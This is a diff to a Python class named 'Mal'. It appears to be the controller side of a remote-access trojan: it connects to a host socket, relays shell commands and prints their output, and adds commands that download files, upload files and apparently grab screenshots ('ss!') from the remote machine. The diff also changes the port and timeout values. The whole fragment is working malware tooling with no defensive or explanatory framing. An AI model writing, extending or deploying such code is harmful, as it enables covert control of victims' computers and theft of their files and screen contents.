@@ -22,8 +22,8 @@ class Mal():
 
         except Exception as e:
             print(f"[-] {str(e)[str(e).find(']')+2:]}")
-            sys.exit(1)
-
+            exit(1)
+    
     def upload_file(self,f_name):
         try:
             f = open(f_name,'rb')
@@ -65,15 +65,21 @@ class Mal():
             elif (len(cmd) == 0):
                 continue
 
-            elif (cmd[:8] == "download"):
+            elif (cmd[:3] == "ss!"):
                 self.c.send(cmd.encode())
-                self.download_file(cmd[9:])
-                continue
+                time.sleep(1)
+                self.download_file(cmd[4:])
+                
+
+            elif (cmd[:9] == "download!"):
+                self.c.send(cmd.encode())
+                self.download_file(cmd[10:])
+                
             
-            elif (cmd[:6] == "upload"):
+            elif (cmd[:7] == "upload!"):
                 self.c.send(cmd.encode())
-                self.upload_file(cmd[7:])
-                continue
+                self.upload_file(cmd[8:])
+               
 
             else:
                 try:
@@ -87,7 +93,7 @@ class Mal():
                         print(output.decode(),end="")
                     except:
                         print(output,end="")
-                    self.c.settimeout(0.15)
+                    self.c.settimeout(0.3)
                     try:
                         output = self.c.recv(1024)
                         
@@ -95,4 +101,4 @@ class Mal():
                         break
                 self.c.settimeout(None)
 
-Mal("192.168.1.5",8888)
+Mal("192.168.1.5",9799)
